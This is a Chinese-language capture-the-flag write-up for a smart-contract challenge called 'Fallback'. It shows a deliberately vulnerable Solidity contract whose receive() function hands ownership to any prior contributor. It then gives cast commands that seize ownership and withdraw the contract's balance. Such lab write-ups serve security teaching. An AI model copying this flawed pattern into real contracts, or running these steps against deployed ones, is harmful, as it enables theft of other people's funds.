# Level 1 Fallback
實例地址：`0x857f120af9D8940ba7E8546c53BAf58bEeC7a1FD`

##  題目說明
仔細看下面的合約程式碼。

要通過這關你需要

獲得這個合約的所有權
1.  把合約的餘額歸零
2.   可能會有用的資訊

*   如何透過與 ABI 互動發送 ether
*   如何在 ABI 之外發送 ether
*   轉換 wei/ether 單位 (參見 help() 指令)
*   fallback 方法

```solidty!
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

## POC
在這個合約能轉移 Owner 的 Method 有兩個分別是 `contribute()` 和 `receive()` ， 在 `contribute()` 中，我們貢獻的 ether 必須要大於 1000 ether，但我們每次只能貢獻小於 0.0001 ether，所以我們必須透握 `receive()` 來獲得 Owner 權限，只需要滿足傳入金額大於 0 和貢獻金額大於 0 即可。 再使用 `withdraw()` 獲取全部金額。

1.  使用 `contribute()` 貢獻 1 wei
    ```bash!
    cast send --private-key=<YOUR_PRIVATE_KEY>  0x857f120af9D8940ba7E8546c53BAf58bEeC7a1FD "contribute()"    --value 1
    ```
2.  向該合約轉 1 wei，觸發 `receive()`
    ```bash!
    cast send --private-key=<YOUR_PRIVATE_KEY>  0x857f120af9D8940ba7E8546c53BAf58bEeC7a1FD --value 1
    ```
3. 查詢 owner
    ```
    cast call 0x857f120af9D8940ba7E8546c53BAf58bEeC7a1FD "owner()   (address)"
    //owner: 0xEBA2Ef27A1B85a4685953E82848e9d2E9ED5b0B6
    ```
4. 使用 `withdraw()` 轉移資產
    ```bash!
    cast send --private-key=<YOUR_PRIVATE_KEY>  0x857f120af9D8940ba7E8546c53BAf58bEeC7a1FD "withdraw()"
    ```
